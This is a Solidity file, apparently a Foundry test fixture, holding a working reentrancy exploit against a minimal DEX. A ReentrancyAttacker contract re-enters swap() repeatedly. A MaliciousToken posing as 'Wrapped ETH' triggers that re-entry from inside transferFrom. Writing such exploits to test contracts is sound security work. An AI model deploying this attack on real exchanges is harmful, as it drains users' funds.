//SPDX-License-Identifier: MIT
pragma solidity ^0.8.29;
import {ERC20} from "../../../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {console} from "../../../lib/forge-std/src/console.sol";
interface IMinimalDex {
  function swap(uint256, uint256, string memory, string memory) external;
}

contract ReentrancyAttacker {
    string private tokenIn;
    string private tokenOut;
    uint256 private amountIn;
    IMinimalDex public immutable dex;
    uint256 public entranceCount;
    uint256 public maxEntranceCount = 4;
    constructor(address _dex, uint256 _maxEntranceCount) {
        maxEntranceCount = _maxEntranceCount;
        entranceCount = 0;
        dex = IMinimalDex(_dex);
    }

    function attack (string memory _tokenIn, string memory _tokenOut, uint256 _amountIn) external {
        // Swap 1 USDC for ETH
        amountIn = _amountIn;
        tokenIn = _tokenIn;
        tokenOut = _tokenOut;
        entranceCount = 1;
        //console.log ("Attacking for .... ", tokenIn, tokenOut, amountIn);
        dex.swap (amountIn, 0, tokenIn, tokenOut);
    }

    function reenter () external {
        // Swap 1 USDC for ETH
        //console.log ("Reentering for .... ", tokenIn, amountIn, entranceCount +1);
        if (++entranceCount > maxEntranceCount) {
            return;
        }
        dex.swap (amountIn, 0, tokenIn, tokenOut);
    }
}

contract MaliciousToken is ERC20 {
    ReentrancyAttacker public attacker;
    IMinimalDex         public dex;


    constructor() ERC20("Wrapped ETH", "WETH") {
        _mint (msg.sender, 1000000 ether);
    }

    function mint (address to, uint256 amount) external {
        _mint (to, amount);
    }

    function setDex(address _dex) external {
      dex = IMinimalDex(_dex);
    }

    function setAttacker(address _attacker) external {
      attacker = ReentrancyAttacker(_attacker);
    }

    function transferFrom (address from, address to, uint256 amount) public virtual override returns (bool) {
         _spendAllowance(from, msg.sender, amount);
        _transfer(from, to, amount);

        // **immediately** trigger the nested swap
        attacker.reenter();
        return true;
    }
}
